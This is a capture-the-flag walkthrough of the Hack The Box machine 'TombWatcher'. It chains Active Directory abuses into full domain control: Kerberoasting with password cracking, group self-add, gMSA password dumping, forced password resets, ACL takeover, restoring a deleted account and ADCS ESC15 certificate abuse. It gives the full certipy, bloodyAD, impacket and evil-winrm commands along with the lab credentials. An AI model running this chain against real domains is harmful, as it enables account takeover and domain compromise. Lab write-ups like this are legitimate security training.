# TombWatcher HTB – Pentest Walkthrough

**Target:** Windows Machine  

---

## Reconnaissance  

Performed an initial Nmap scan to find open ports and services:

```bash
nmap -sC -sV 10.10.11.72

    Port 5985 (WinRM) open (prime candidate for exploitation).

    Default credentials:

    henry : h3nry_987TGV!

Checked HTTP service on port 80 but found nothing noteworthy.
Initial Enumeration – Henry

Used BloodHound to map the AD environment.

Findings:

    henry has WriteSPN permissions over alfred.

Kerberoasting Alfred

Used targetedKerberoast to dump Alfred’s hash:

targetedKerberoast.py -d tombwatcher.htb -u henry -p 'h3nry_987TGV!'

Saved the hash to hash.txt and cracked it with John the Ripper:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Result:

alfred : basketball

Escalating via Alfred

Re-ran BloodHound as Alfred.

Findings:

    Alfred has AddSelf permission to the INFRASTRUCTURE group.

Added Alfred to the group:

bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
-u 'alfred' -p 'basketball' \
add groupMember INFRASTRUCTURE alfred

Targeting Ansible Account

Findings:

    ansible_dev$ has ReadGMSAPassword and is a member of INFRASTRUCTURE.

Dumped Ansible’s hash:

gMSADumper.py -u alfred -p basketball -d tombwatcher.htb

Used Ansible’s credentials for deeper enumeration.
Escalating to Sam

BloodHound revealed:

    Ansible has ForceChangePassword permission for sam.

Reset Sam’s password:

bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
-u 'ansible_dev$' -H '<HASH>' \
set password sam 'Abc123456!'

Pivoting to John

With Sam’s credentials:

    Sam has WriteOwner over john.

Steps:

    Made Sam the owner of John’s account.

    Granted Sam GenericAll over John.

    Changed John’s password.

Logged in as John with Evil-WinRM:

evil-winrm -i 10.10.11.72 -u john -p '<NEWPASSWORD>'

Grabbed user.txt.
Privilege Escalation
ADCS OU Control

BloodHound showed John had GenericAll over ADCS OU.

Gained full control with impacket-dacledit:

impacket-dacledit -action write -rights FullControl \
-principal john -target-ou "OU=ADCS,DC=tombwatcher,DC=htb"

Restoring Cert_Admin

Found cert_admin was deleted.

Restored and reset password via PowerShell:

Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword `
(ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)

Certificate Services Exploit (ESC15)

Enumerated certificate services:

certipy find -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
-dc-ip 10.10.11.72

Found ESC15 vulnerability (RCE).

Requested a certificate for Administrator:

certipy req \
-u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
-dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
-ca 'tombwatcher-CA-1' -template 'WebServer' \
-upn 'administrator@tombwatcher.htb' \
-application-policies 'Client Authentication'

Authenticated via LDAP shell:

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell

Changed Administrator’s password.
Root Access

Logged in as Administrator:

evil-winrm -i 10.10.11.72 -u 'administrator' -p '<NEWPASSWORD>'

Retrieved root.txt.
Key Takeaways

    Layered Privilege Escalation: Excellent example of chaining user permissions to pivot. 
    I really enjoy these types of boxes that require me to think about lateral escalation!
    It's great practice for really understanding how tools are used in what type of situation, why they are needed,
    and how to use them!

    AD Object Restoration: Restoring deleted accounts was essential. This was unfamilar to me; using google saved me
    though, and the solution was easier than i'd thought. 

    Certificate Abuse (ESC15): Misconfigured ADCS enabled domain admin takeover. 

    Enumeration Wins: BloodHound and Certipy were critical tools in this engagement. I used bloodhound a lot in this 
    machine! Bloodhound is one of those tools you have to have equipped on you for use when dealing with AD
    in my opinion. It makes a greate enumeration tool and hasn't failed me. 
